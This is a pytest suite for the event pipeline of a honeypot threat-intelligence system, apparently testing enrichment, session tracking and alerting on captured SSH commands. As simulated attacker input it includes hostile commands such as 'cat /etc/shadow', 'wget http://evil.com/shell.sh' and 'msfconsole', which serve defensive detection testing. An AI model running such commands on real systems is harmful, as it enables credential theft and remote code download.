"""
CI/CDecoy -- CTI Pipeline Tests

Tests for the event collection pipeline (Collector class) in cti/pipeline.py.
Covers event processing, schema validation, NATS message handling, DB insertion,
session tracking, error handling, enrichment integration, alert generation,
and exponential backoff on fetch failures.

All external dependencies (NATS, asyncpg) are mocked.
"""

import asyncio
import json
import uuid
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import pytest_asyncio

# Re-use conftest helpers
from conftest import MockAsyncpgPool
from pipeline import Collector

# ── Helpers ────────────────────────────────────────────


def _make_msg(payload: dict, subject: str = "cicdecoy.decoy.events.command") -> MagicMock:
    """Build a mock NATS message with .data, .subject, and .ack()."""
    msg = MagicMock()
    msg.data = json.dumps(payload).encode()
    msg.subject = subject
    msg.ack = AsyncMock()
    return msg


def _make_msg_raw(raw_bytes: bytes, subject: str = "cicdecoy.decoy.events.command") -> MagicMock:
    """Build a mock NATS message from raw bytes (for malformed JSON tests)."""
    msg = MagicMock()
    msg.data = raw_bytes
    msg.subject = subject
    msg.ack = AsyncMock()
    return msg


def _minimal_event(
    event_type="command",
    command="whoami",
    session_id=None,
    source_ip="198.51.100.42",
    decoy_name="ssh-decoy-01",
    decoy_tier=2,
):
    """Build a minimal event payload matching what the SSH decoy publishes."""
    return {
        "event_id": f"evt-{uuid.uuid4().hex[:12]}",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "decoy_name": decoy_name,
        "decoy_tier": decoy_tier,
        "session_id": session_id or f"sess-{uuid.uuid4().hex[:12]}",
        "event_type": event_type,
        "source_ip": source_ip,
        "source_port": 44120,
        "data": {"command": command, "client_ip": source_ip, "client_port": 44120},
    }


@pytest_asyncio.fixture
async def collector():
    """Create a Collector with mocked DB pool and NATS connection."""
    c = Collector(nats_url="nats://mock:4222", db_dsn="postgresql://mock/mock")
    c.pool = MockAsyncpgPool()
    c.nc = AsyncMock()
    c.nc.publish = AsyncMock()
    c.nc.drain = AsyncMock()
    return c


# ══════════════════════════════════════════════════════
#  1. Event Processing — valid events enriched and stored
# ══════════════════════════════════════════════════════


class TestEventProcessing:

    @pytest.mark.asyncio
    async def test_valid_event_increments_count(self, collector):
        event = _minimal_event(command="whoami")
        msg = _make_msg(event)
        await collector._process_message(msg)
        assert collector.event_count == 1
        assert collector.error_count == 0

    @pytest.mark.asyncio
    async def test_multiple_events_counted(self, collector):
        for cmd in ["whoami", "id", "uname -a"]:
            msg = _make_msg(_minimal_event(command=cmd))
            await collector._process_message(msg)
        assert collector.event_count == 3

    @pytest.mark.asyncio
    async def test_event_without_event_id_gets_uuid(self, collector):
        """Events missing event_id should get a generated UUID."""
        event = _minimal_event()
        del event["event_id"]
        msg = _make_msg(event)
        await collector._process_message(msg)
        assert collector.event_count == 1

    @pytest.mark.asyncio
    async def test_event_without_timestamp_uses_now(self, collector):
        """Events missing timestamp should get current UTC time."""
        event = _minimal_event()
        del event["timestamp"]
        msg = _make_msg(event)
        await collector._process_message(msg)
        assert collector.event_count == 1

    @pytest.mark.asyncio
    async def test_event_with_datetime_timestamp(self, collector):
        """Events with a datetime object as timestamp should work."""
        event = _minimal_event()
        # The JSON round-trip makes this a string; test the isoformat path
        event["timestamp"] = datetime.now(timezone.utc).isoformat()
        msg = _make_msg(event)
        await collector._process_message(msg)
        assert collector.event_count == 1


# ══════════════════════════════════════════════════════
#  2. Schema Validation — malformed events handled gracefully
# ══════════════════════════════════════════════════════


class TestSchemaValidation:

    @pytest.mark.asyncio
    async def test_malformed_json_no_crash(self, collector):
        msg = _make_msg_raw(b"not valid json{{{")
        await collector._process_message(msg)
        assert collector.error_count == 1
        assert collector.event_count == 0

    @pytest.mark.asyncio
    async def test_empty_json_object(self, collector):
        """An empty JSON object should still be processable (all defaults)."""
        msg = _make_msg({})
        await collector._process_message(msg)
        assert collector.event_count == 1
        assert collector.error_count == 0

    @pytest.mark.asyncio
    async def test_missing_all_optional_fields(self, collector):
        """Minimal payload with only required JSON structure should not crash."""
        msg = _make_msg({"event_type": "unknown"})
        await collector._process_message(msg)
        assert collector.event_count == 1

    @pytest.mark.asyncio
    async def test_nested_source_fallback(self, collector):
        """decoy_name and decoy_tier should fall back to source.decoy/source.tier."""
        event = {
            "source": {"decoy": "fallback-decoy", "tier": 3},
            "event_type": "command",
            "data": {"command": "ls"},
        }
        msg = _make_msg(event)
        await collector._process_message(msg)
        assert collector.event_count == 1

    @pytest.mark.asyncio
    async def test_binary_garbage_data(self, collector):
        """Binary garbage that cannot be decoded as UTF-8 raises at decode level.
        The pipeline does not currently catch UnicodeDecodeError, so this
        propagates. This test documents the current behavior."""
        msg = _make_msg_raw(b"\x00\x01\x02\xff\xfe")
        with pytest.raises(UnicodeDecodeError):
            await collector._process_message(msg)

    @pytest.mark.asyncio
    async def test_non_integer_timestamp(self, collector):
        """A numeric timestamp (not string, not datetime) should use now()."""
        event = _minimal_event()
        event["timestamp"] = 1700000000
        msg = _make_msg(event)
        await collector._process_message(msg)
        assert collector.event_count == 1


# ══════════════════════════════════════════════════════
#  3. NATS Message Handling — ack, deserialization
# ══════════════════════════════════════════════════════


class TestNATSMessageHandling:

    @pytest.mark.asyncio
    async def test_push_subscribe_callback(self, collector):
        """_on_message_push delegates to _process_message."""
        event = _minimal_event()
        msg = _make_msg(event)
        await collector._on_message_push(msg)
        assert collector.event_count == 1

    @pytest.mark.asyncio
    async def test_enriched_event_republished(self, collector):
        """Non-loopback events are republished to cicdecoy.enriched.events.*."""
        event = _minimal_event(source_ip="198.51.100.42", event_type="command")
        msg = _make_msg(event)
        await collector._process_message(msg)

        # At least one publish call for enriched event
        publish_calls = collector.nc.publish.call_args_list
        enriched_subjects = [c.args[0] for c in publish_calls
                             if c.args[0].startswith("cicdecoy.enriched.events.")]
        assert len(enriched_subjects) >= 1
        assert "cicdecoy.enriched.events.command" in enriched_subjects

    @pytest.mark.asyncio
    async def test_loopback_ip_not_republished(self, collector):
        """Events from 127.0.0.1 should NOT be republished (healthcheck noise)."""
        event = _minimal_event(source_ip="127.0.0.1")
        msg = _make_msg(event)
        await collector._process_message(msg)

        # No enriched publish should have happened
        publish_calls = collector.nc.publish.call_args_list
        enriched_calls = [c for c in publish_calls
                          if c.args[0].startswith("cicdecoy.enriched.events.")]
        assert len(enriched_calls) == 0

    @pytest.mark.asyncio
    async def test_ipv6_loopback_not_republished(self, collector):
        """Events from ::1 should NOT be republished."""
        event = _minimal_event(source_ip="::1")
        msg = _make_msg(event)
        await collector._process_message(msg)

        publish_calls = collector.nc.publish.call_args_list
        enriched_calls = [c for c in publish_calls
                          if c.args[0].startswith("cicdecoy.enriched.events.")]
        assert len(enriched_calls) == 0

    @pytest.mark.asyncio
    async def test_enriched_payload_structure(self, collector):
        """Republished enriched event should have all expected fields."""
        event = _minimal_event(command="cat /etc/shadow", event_type="command")
        msg = _make_msg(event)
        await collector._process_message(msg)

        publish_calls = collector.nc.publish.call_args_list
        enriched_calls = [c for c in publish_calls
                          if c.args[0].startswith("cicdecoy.enriched.events.")]
        assert len(enriched_calls) == 1

        payload = json.loads(enriched_calls[0].args[1].decode())
        expected_keys = {
            "event_id", "timestamp", "decoy_name", "decoy_tier",
            "session_id", "event_type", "source_ip", "source_port",
            "username", "severity", "mitre_techniques", "tool_signatures",
            "tags", "session_analysis", "data", "raw_data",
        }
        assert expected_keys.issubset(set(payload.keys()))


# ══════════════════════════════════════════════════════
#  4. Database Insertion — correct fields into TimescaleDB
# ══════════════════════════════════════════════════════


class TestDatabaseInsertion:

    @pytest.mark.asyncio
    async def test_insert_called_with_correct_arg_count(self, collector):
        """DB execute should receive 13 positional args matching the INSERT."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="id")
        msg = _make_msg(event)
        await collector._process_message(msg)

        assert conn.execute.call_count >= 1
        # The first execute call is the INSERT INTO decoy_events
        first_call = conn.execute.call_args_list[0]
        query = first_call.args[0]
        positional_args = first_call.args[1:]
        assert "INSERT INTO decoy_events" in query
        assert len(positional_args) == 14

    @pytest.mark.asyncio
    async def test_insert_fields_order(self, collector):
        """Verify the positional arguments match the expected column order."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        sid = "sess-test123"
        event = _minimal_event(
            command="uname -a",
            session_id=sid,
            decoy_name="honeypot-01",
            decoy_tier=3,
            source_ip="10.0.0.1",
        )
        msg = _make_msg(event)
        await collector._process_message(msg)

        args = conn.execute.call_args_list[0].args
        # args[0] = query, args[1..13] = positional values
        timestamp = args[2]
        decoy_name = args[3]
        decoy_tier = args[4]
        session_id_val = args[5]
        event_type = args[6]
        source_ip = args[7]

        assert decoy_name == "honeypot-01"
        assert decoy_tier == 3
        assert session_id_val == sid
        assert event_type == "command"
        assert source_ip == "10.0.0.1"
        assert isinstance(timestamp, datetime)

    @pytest.mark.asyncio
    async def test_enrichment_fields_serialized_as_json(self, collector):
        """mitre_techniques, tool_signatures, and tags should be JSON strings."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="nmap -sV 10.0.0.1")
        msg = _make_msg(event)
        await collector._process_message(msg)

        args = conn.execute.call_args_list[0].args
        # args[10] = mitre_techniques, args[11] = tool_signatures,
        # args[12] = tags, args[13] = geo, args[14] = raw_data
        mitre_json = args[10]
        tools_json = args[11]
        tags_json = args[12]
        raw_json = args[14]

        # All should be valid JSON strings
        mitre = json.loads(mitre_json)
        tools = json.loads(tools_json)
        tags = json.loads(tags_json)
        raw = json.loads(raw_json)

        assert isinstance(mitre, list)
        assert isinstance(tools, list)
        assert isinstance(tags, list)
        assert isinstance(raw, dict)

    @pytest.mark.asyncio
    async def test_on_conflict_do_nothing(self, collector):
        """INSERT query should use ON CONFLICT ... DO NOTHING for idempotency."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        msg = _make_msg(_minimal_event())
        await collector._process_message(msg)

        query = conn.execute.call_args_list[0].args[0]
        assert "ON CONFLICT" in query
        assert "DO NOTHING" in query

    @pytest.mark.asyncio
    async def test_null_source_ip_when_empty(self, collector):
        """Empty source_ip should be inserted as None (NULL)."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event()
        event["source_ip"] = ""
        event["data"]["client_ip"] = ""
        msg = _make_msg(event)
        await collector._process_message(msg)

        args = conn.execute.call_args_list[0].args
        source_ip_val = args[7]
        assert source_ip_val is None


# ══════════════════════════════════════════════════════
#  5. Session Tracking — session events update records
# ══════════════════════════════════════════════════════


class TestSessionTracking:

    @pytest.mark.asyncio
    async def test_session_analyzer_ingest_called(self, collector):
        """Non-session.end events with a session_id should call analyzer.ingest."""
        event = _minimal_event(event_type="command", session_id="sess-abc")
        msg = _make_msg(event)

        with patch.object(collector.session_analyzer, "ingest",
                          new_callable=AsyncMock,
                          return_value={"alert_triggers": []}) as mock_ingest:
            await collector._process_message(msg)
            mock_ingest.assert_called_once()
            call_args = mock_ingest.call_args
            assert call_args.args[0] == "sess-abc"

    @pytest.mark.asyncio
    async def test_session_end_calls_close_session(self, collector):
        """session.end events should call close_session and write summary."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        # First ingest an event to create the session
        await collector.session_analyzer.ingest("sess-end-test", {
            "event_type": "command",
            "mitre_techniques": [],
            "tool_signatures": [],
            "severity": "info",
            "tags": [],
            "data": {},
        })

        event = _minimal_event(event_type="session.end", session_id="sess-end-test")
        msg = _make_msg(event)
        await collector._process_message(msg)

        # close_session returns a summary which triggers _write_session_summary
        # The engage_outcomes INSERT should have been called
        execute_calls = conn.execute.call_args_list
        engage_inserts = [c for c in execute_calls
                          if "engage_outcomes" in c.args[0]]
        assert len(engage_inserts) == 1

    @pytest.mark.asyncio
    async def test_session_end_nonexistent_still_writes_summary(self, collector):
        """session.end for previously unknown session still writes a summary
        because ingest() is called before close_session(), creating session state."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(event_type="session.end", session_id="sess-ghost")
        msg = _make_msg(event)
        await collector._process_message(msg)

        execute_calls = conn.execute.call_args_list
        engage_inserts = [c for c in execute_calls
                          if "engage_outcomes" in c.args[0]]
        assert len(engage_inserts) == 1

    @pytest.mark.asyncio
    async def test_no_session_id_skips_analyzer(self, collector):
        """Events without a session_id should not call session_analyzer."""
        event = _minimal_event()
        event["session_id"] = ""
        msg = _make_msg(event)

        with patch.object(collector.session_analyzer, "ingest") as mock_ingest:
            await collector._process_message(msg)
            mock_ingest.assert_not_called()

    @pytest.mark.asyncio
    async def test_write_session_summary_fields(self, collector):
        """_write_session_summary should insert correct fields into engage_outcomes."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        summary = {
            "session_id": "sess-summary-test",
            "duration_seconds": 120.5,
            "command_count": 15,
            "techniques_observed": [{"technique_id": "T1033"}],
            "classification": "manual_operator",
            "phases_seen": ["discovery", "credential-access"],
            "tool_signatures": ["nmap"],
            "behavioral_score": 0.65,
            "kill_chain": False,
        }
        await collector._write_session_summary(summary)

        assert conn.execute.call_count == 1
        args = conn.execute.call_args.args
        assert "engage_outcomes" in args[0]
        assert args[1] == "sess-summary-test"       # session_id
        assert args[2] == "unknown"                  # decoy_name (default)
        assert args[3] == 120.5                      # duration
        assert args[4] == 15                         # commands_captured
        assert args[5] == 1                          # ttps_observed (len of techniques)
        assert args[6] == "manual_operator"          # intelligence_value


# ══════════════════════════════════════════════════════
#  6. Error Handling — DB failures, NATS issues, bad JSON
# ══════════════════════════════════════════════════════


class TestErrorHandling:

    @pytest.mark.asyncio
    async def test_db_insert_failure_increments_error(self, collector):
        """DB insert failure should increment error_count, not crash."""
        conn = collector.pool.conn
        conn.execute = AsyncMock(side_effect=Exception("connection refused"))

        event = _minimal_event()
        msg = _make_msg(event)
        await collector._process_message(msg)

        assert collector.error_count == 1
        assert collector.event_count == 0

    @pytest.mark.asyncio
    async def test_enriched_republish_failure_nonfatal(self, collector):
        """Failure to republish enriched event should not crash or count as error."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()  # DB succeeds
        collector.nc.publish = AsyncMock(side_effect=Exception("NATS down"))

        event = _minimal_event(source_ip="198.51.100.42")
        msg = _make_msg(event)
        await collector._process_message(msg)

        # DB insert succeeded, event was counted
        assert collector.event_count == 1
        # Republish failure is non-fatal, should not increment error_count
        # (the pipeline logs it at DEBUG level)

    @pytest.mark.asyncio
    async def test_session_summary_write_failure_nonfatal(self, collector):
        """Failure to write session summary should not crash but should increment error_count."""
        conn = collector.pool.conn
        conn.execute = AsyncMock(side_effect=Exception("DB timeout"))

        summary = {
            "session_id": "sess-fail",
            "duration_seconds": 10,
            "command_count": 1,
            "techniques_observed": [],
            "classification": "scanner",
            "phases_seen": [],
            "tool_signatures": [],
            "behavioral_score": 0.1,
            "kill_chain": False,
        }
        errors_before = collector.error_count
        # Should not raise
        await collector._write_session_summary(summary)
        assert collector.error_count == errors_before + 1

    @pytest.mark.asyncio
    async def test_verify_schema_missing_table(self, collector):
        """_verify_schema should raise RuntimeError if table missing."""
        conn = collector.pool.conn
        conn.fetchval = AsyncMock(return_value=False)

        with pytest.raises(RuntimeError, match="schema not initialized"):
            await collector._verify_schema()

    @pytest.mark.asyncio
    async def test_verify_schema_table_exists(self, collector):
        """_verify_schema should pass if table exists."""
        conn = collector.pool.conn
        conn.fetchval = AsyncMock(return_value=True)

        # Should not raise
        await collector._verify_schema()

    @pytest.mark.asyncio
    async def test_stop_drains_and_closes(self, collector):
        """stop() should drain NATS and close DB pool."""
        await collector.stop()
        collector.nc.drain.assert_awaited_once()
        # pool.close is not async in our mock, but the method is called

    @pytest.mark.asyncio
    async def test_alert_publish_failure_nonfatal(self, collector):
        """If publishing a session alert fails, processing continues."""
        # Set up a session that will generate alerts
        await collector.session_analyzer.ingest("sess-alert-fail", {
            "event_type": "command.exec",
            "mitre_techniques": [
                {"technique_id": "T1033", "technique_name": "x", "tactic": "discovery"},
            ],
            "tool_signatures": [],
            "severity": "low",
            "tags": [],
            "data": {},
        })
        await collector.session_analyzer.ingest("sess-alert-fail", {
            "event_type": "command.exec",
            "mitre_techniques": [
                {"technique_id": "T1003", "technique_name": "x", "tactic": "credential-access"},
            ],
            "tool_signatures": [],
            "severity": "high",
            "tags": [],
            "data": {},
        })

        # Now send an event that triggers kill chain (3rd phase)
        # Make publish fail for alert subjects
        original_publish = AsyncMock()

        async def failing_publish(subject, data):
            if "cicdecoy.alert." in subject:
                raise Exception("NATS publish failed")
            return await original_publish(subject, data)

        collector.nc.publish = AsyncMock(side_effect=failing_publish)
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(
            event_type="command",
            command="ssh root@10.0.0.5",
            session_id="sess-alert-fail",
        )
        msg = _make_msg(event)
        await collector._process_message(msg)

        # Event should still be stored despite alert publish failure
        assert collector.event_count == 1


# ══════════════════════════════════════════════════════
#  7. Enrichment Integration — pipeline calls enrichment correctly
# ══════════════════════════════════════════════════════


class TestEnrichmentIntegration:

    @pytest.mark.asyncio
    async def test_command_enriched_with_mitre(self, collector):
        """Pipeline should enrich commands and insert MITRE techniques."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="cat /etc/shadow")
        msg = _make_msg(event)
        await collector._process_message(msg)

        args = conn.execute.call_args_list[0].args
        mitre_json = args[10]
        techniques = json.loads(mitre_json)
        assert any(t["technique_id"] == "T1003.008" for t in techniques)

    @pytest.mark.asyncio
    async def test_severity_from_enrichment(self, collector):
        """Enrichment severity should be used in the DB insert."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="cat /etc/shadow")
        msg = _make_msg(event)
        await collector._process_message(msg)

        args = conn.execute.call_args_list[0].args
        severity = args[9]
        assert severity == "high"

    @pytest.mark.asyncio
    async def test_tool_signatures_enriched(self, collector):
        """Tool signatures should be detected and inserted."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="nmap -sV 10.0.0.0/24")
        msg = _make_msg(event)
        await collector._process_message(msg)

        args = conn.execute.call_args_list[0].args
        tools_json = args[11]
        tools = json.loads(tools_json)
        assert "nmap" in tools

    @pytest.mark.asyncio
    async def test_tags_derived_from_tactics(self, collector):
        """Tags should contain the tactics from enrichment."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="cat /etc/shadow")
        msg = _make_msg(event)
        await collector._process_message(msg)

        args = conn.execute.call_args_list[0].args
        tags_json = args[12]
        tags = json.loads(tags_json)
        assert "credential-access" in tags

    @pytest.mark.asyncio
    async def test_benign_command_info_severity(self, collector):
        """Commands with no MITRE match should get info severity."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="echo hello")
        msg = _make_msg(event)
        await collector._process_message(msg)

        args = conn.execute.call_args_list[0].args
        severity = args[9]
        assert severity == "info"

    @pytest.mark.asyncio
    async def test_enrichment_called_with_full_raw(self, collector):
        """enrich_event receives the full raw event dict."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="wget http://evil.com/shell.sh")
        msg = _make_msg(event)

        with patch("pipeline.enrich_event", wraps=__import__("enrichment").enrich_event) as mock_enrich:
            await collector._process_message(msg)
            mock_enrich.assert_called_once()
            raw_arg = mock_enrich.call_args.args[0]
            assert "data" in raw_arg
            assert raw_arg["data"]["command"] == "wget http://evil.com/shell.sh"


# ══════════════════════════════════════════════════════
#  8. Alert Generation — high-severity events trigger actions
# ══════════════════════════════════════════════════════


class TestAlertGeneration:

    @pytest.mark.asyncio
    async def test_kill_chain_triggers_alert_publish(self, collector):
        """A kill chain detection should publish an alert to NATS."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()
        sid = "sess-kc-alert"

        # Build up a kill chain across 3 phases
        events = [
            _minimal_event(command="whoami", event_type="command", session_id=sid),
            _minimal_event(command="cat /etc/shadow", event_type="command", session_id=sid),
            _minimal_event(command="ssh root@10.0.0.5", event_type="command", session_id=sid),
        ]

        for event in events:
            msg = _make_msg(event)
            await collector._process_message(msg)

        # Check that alert was published
        publish_calls = collector.nc.publish.call_args_list
        alert_subjects = [c.args[0] for c in publish_calls
                          if "cicdecoy.alert.session." in c.args[0]]
        assert len(alert_subjects) > 0

    @pytest.mark.asyncio
    async def test_c2_tool_triggers_alert(self, collector):
        """C2 framework detection should trigger an alert publish."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()
        sid = "sess-c2"

        event = _minimal_event(command="msfconsole -q", session_id=sid)
        msg = _make_msg(event)
        await collector._process_message(msg)

        publish_calls = collector.nc.publish.call_args_list
        alert_subjects = [c.args[0] for c in publish_calls
                          if "cicdecoy.alert.session." in c.args[0]]
        assert any("c2_framework_detected" in s for s in alert_subjects)

    @pytest.mark.asyncio
    async def test_alert_payload_contains_session_id(self, collector):
        """Alert payloads should include the session_id."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()
        sid = "sess-alert-payload"

        event = _minimal_event(command="msfconsole", session_id=sid)
        msg = _make_msg(event)
        await collector._process_message(msg)

        publish_calls = collector.nc.publish.call_args_list
        alert_calls = [c for c in publish_calls
                       if "cicdecoy.alert.session." in c.args[0]]
        assert len(alert_calls) > 0
        payload = json.loads(alert_calls[0].args[1].decode())
        assert payload["session_id"] == sid

    @pytest.mark.asyncio
    async def test_no_alert_for_benign_events(self, collector):
        """Benign commands should not generate alerts."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event(command="echo hello", session_id="sess-benign")
        msg = _make_msg(event)
        await collector._process_message(msg)

        publish_calls = collector.nc.publish.call_args_list
        alert_calls = [c for c in publish_calls
                       if "cicdecoy.alert.session." in c.args[0]]
        assert len(alert_calls) == 0

    @pytest.mark.asyncio
    async def test_dangerous_progression_alert(self, collector):
        """Discovery -> credential-access -> lateral-movement should trigger
        a dangerous_progression alert."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()
        sid = "sess-progression"

        commands = [
            ("whoami", "command"),
            ("cat /etc/shadow", "command"),
            ("ssh root@10.0.0.5", "command"),
        ]

        for cmd, etype in commands:
            event = _minimal_event(command=cmd, event_type=etype, session_id=sid)
            msg = _make_msg(event)
            await collector._process_message(msg)

        publish_calls = collector.nc.publish.call_args_list
        alert_payloads = []
        for c in publish_calls:
            if "cicdecoy.alert.session." in c.args[0]:
                alert_payloads.append(json.loads(c.args[1].decode()))

        alert_types = [a.get("alert_type") for a in alert_payloads]
        assert "dangerous_progression" in alert_types


# ══════════════════════════════════════════════════════
#  9. Username Resolution
# ══════════════════════════════════════════════════════


class TestUsernameResolution:

    @pytest.mark.asyncio
    async def test_username_from_data(self, collector):
        """Username should be extracted from data.username."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event()
        event["data"]["username"] = "admin"
        msg = _make_msg(event)
        await collector._process_message(msg)

        # Check enriched event payload
        publish_calls = collector.nc.publish.call_args_list
        enriched = [c for c in publish_calls
                    if c.args[0].startswith("cicdecoy.enriched.events.")]
        if enriched:
            payload = json.loads(enriched[0].args[1].decode())
            assert payload["username"] == "admin"

    @pytest.mark.asyncio
    async def test_username_fallback_chain(self, collector):
        """Username resolution should try data.username, data.user, raw.username, raw.user."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        event = _minimal_event()
        event["data"].pop("username", None)
        event["data"].pop("user", None)
        event["username"] = "root"
        msg = _make_msg(event)
        await collector._process_message(msg)

        publish_calls = collector.nc.publish.call_args_list
        enriched = [c for c in publish_calls
                    if c.args[0].startswith("cicdecoy.enriched.events.")]
        if enriched:
            payload = json.loads(enriched[0].args[1].decode())
            assert payload["username"] == "root"


# ══════════════════════════════════════════════════════
#  10. Idle Session Sweep
# ══════════════════════════════════════════════════════


class TestIdleSessionSweep:

    @pytest.mark.asyncio
    async def test_sweep_writes_summaries(self, collector):
        """_sweep_idle_sessions should write summaries for evicted sessions."""
        conn = collector.pool.conn
        conn.execute = AsyncMock()

        # Set idle timeout to 0 so sessions are immediately idle
        collector.session_analyzer._idle_timeout = 0

        # Create a session
        await collector.session_analyzer.ingest("sess-idle", {
            "event_type": "command.exec",
            "mitre_techniques": [],
            "tool_signatures": [],
            "severity": "info",
            "tags": [],
            "data": {},
        })

        import time
        time.sleep(0.01)

        summaries = await collector.session_analyzer.sweep_idle()
        assert len(summaries) == 1

        for summary in summaries:
            await collector._write_session_summary(summary)

        execute_calls = conn.execute.call_args_list
        engage_inserts = [c for c in execute_calls
                          if "engage_outcomes" in c.args[0]]
        assert len(engage_inserts) == 1


# ══════════════════════════════════════════════════════
#  11. Exponential Backoff on Fetch Failures
# ══════════════════════════════════════════════════════


class TestExponentialBackoff:
    """Test the exponential backoff behaviour in the pull loop.

    The loop lives inside Collector.start(), which is an infinite loop.
    We control it by making the mock subscription's fetch() raise a
    configurable sequence of exceptions and then raise asyncio.CancelledError
    to break out of the loop.  asyncio.sleep is patched so we can inspect
    the delay values without actually waiting.
    """

    @staticmethod
    def _build_start_mocks(collector, fetch_side_effects):
        """Wire up mocks so collector.start() reaches the pull loop.

        ``fetch_side_effects`` is a list consumed by sub.fetch; the final
        element should be ``asyncio.CancelledError`` to terminate the loop.
        """
        # DB pool already mocked by the fixture; just need _verify_schema
        collector.pool.conn.fetchval = AsyncMock(return_value=True)

        # NATS connect / jetstream / pull_subscribe
        mock_sub = MagicMock()
        mock_sub.fetch = AsyncMock(side_effect=fetch_side_effects)

        mock_js = MagicMock()
        mock_js.pull_subscribe = AsyncMock(return_value=mock_sub)

        # nc.jetstream() is a sync call in the real NATS client, so use
        # MagicMock (not AsyncMock) for nc and make jetstream return mock_js
        # directly (not as a coroutine).
        mock_nc = MagicMock()
        mock_nc.jetstream.return_value = mock_js
        mock_nc.drain = AsyncMock()

        return mock_nc, mock_sub

    @pytest.mark.asyncio
    async def test_backoff_increases_exponentially(self, collector):
        """Consecutive fetch failures should produce 2^0, 2^1, 2^2 ... base delays."""
        num_failures = 4  # expect base delays 1, 2, 4, 8
        effects = [RuntimeError("boom")] * num_failures + [asyncio.CancelledError]
        mock_nc, _ = self._build_start_mocks(collector, effects)

        sleep_delays = []

        async def capture_sleep(delay):
            sleep_delays.append(delay)

        with patch("nats.connect", AsyncMock(return_value=mock_nc)), \
             patch("asyncpg.create_pool", AsyncMock(return_value=collector.pool)), \
             patch("asyncio.sleep", side_effect=capture_sleep), \
             patch("random.uniform", return_value=0.0):
            with pytest.raises(asyncio.CancelledError):
                await collector.start()

        assert len(sleep_delays) == num_failures
        # With jitter forced to 0, delays should be exactly 2^n
        assert sleep_delays == [1, 2, 4, 8]

    @pytest.mark.asyncio
    async def test_backoff_capped_at_60(self, collector):
        """Backoff should never exceed 60 seconds regardless of failure count."""
        # 7 consecutive failures: 2^0=1, 2^1=2, 2^2=4, 2^3=8, 2^4=16, 2^5=32, 2^6=64->60
        num_failures = 7
        effects = [RuntimeError("boom")] * num_failures + [asyncio.CancelledError]
        mock_nc, _ = self._build_start_mocks(collector, effects)

        sleep_delays = []

        async def capture_sleep(delay):
            sleep_delays.append(delay)

        with patch("nats.connect", AsyncMock(return_value=mock_nc)), \
             patch("asyncpg.create_pool", AsyncMock(return_value=collector.pool)), \
             patch("asyncio.sleep", side_effect=capture_sleep), \
             patch("random.uniform", return_value=0.0):
            with pytest.raises(asyncio.CancelledError):
                await collector.start()

        assert len(sleep_delays) == num_failures
        # Last delay must be capped at 60, not 64
        assert sleep_delays[-1] == 60
        assert all(d <= 60 for d in sleep_delays)

    @pytest.mark.asyncio
    async def test_backoff_resets_on_success(self, collector):
        """After a successful fetch, the next failure should start back at 2^0 = 1."""
        # Sequence: 2 failures, 1 success (returns messages), 2 more failures
        mock_msg = _make_msg(_minimal_event())

        call_count = 0

        async def fetch_sequence(batch, timeout):
            nonlocal call_count
            idx = call_count
            call_count += 1
            if idx < 2:
                raise RuntimeError("boom")
            if idx == 2:
                return [mock_msg]  # success
            if idx < 5:
                raise RuntimeError("boom again")
            raise asyncio.CancelledError

        mock_nc, mock_sub = self._build_start_mocks(collector, [])
        mock_sub.fetch = AsyncMock(side_effect=fetch_sequence)

        sleep_delays = []

        async def capture_sleep(delay):
            sleep_delays.append(delay)

        with patch("nats.connect", AsyncMock(return_value=mock_nc)), \
             patch("asyncpg.create_pool", AsyncMock(return_value=collector.pool)), \
             patch("asyncio.sleep", side_effect=capture_sleep), \
             patch("random.uniform", return_value=0.0):
            with pytest.raises(asyncio.CancelledError):
                await collector.start()

        # First 2 failures: delays 1, 2
        # Then success resets counter
        # Next 2 failures: delays 1, 2 (reset, not 4, 8)
        assert sleep_delays == [1, 2, 1, 2]

    @pytest.mark.asyncio
    async def test_backoff_resets_on_timeout(self, collector):
        """A NATS TimeoutError (no messages) should reset consecutive_failures to 0."""
        import nats.errors

        call_count = 0

        async def fetch_sequence(batch, timeout):
            nonlocal call_count
            idx = call_count
            call_count += 1
            if idx < 2:
                raise RuntimeError("boom")
            if idx == 2:
                raise nats.errors.TimeoutError  # normal "no messages"
            if idx < 5:
                raise RuntimeError("boom again")
            raise asyncio.CancelledError

        mock_nc, mock_sub = self._build_start_mocks(collector, [])
        mock_sub.fetch = AsyncMock(side_effect=fetch_sequence)

        sleep_delays = []

        async def capture_sleep(delay):
            sleep_delays.append(delay)

        with patch("nats.connect", AsyncMock(return_value=mock_nc)), \
             patch("asyncpg.create_pool", AsyncMock(return_value=collector.pool)), \
             patch("asyncio.sleep", side_effect=capture_sleep), \
             patch("random.uniform", return_value=0.0):
            with pytest.raises(asyncio.CancelledError):
                await collector.start()

        # 2 failures (1, 2), timeout resets, 2 more failures (1, 2)
        assert sleep_delays == [1, 2, 1, 2]

    @pytest.mark.asyncio
    async def test_jitter_applied(self, collector):
        """Sleep value should be backoff + jitter, so always > base backoff when jitter > 0."""
        num_failures = 3
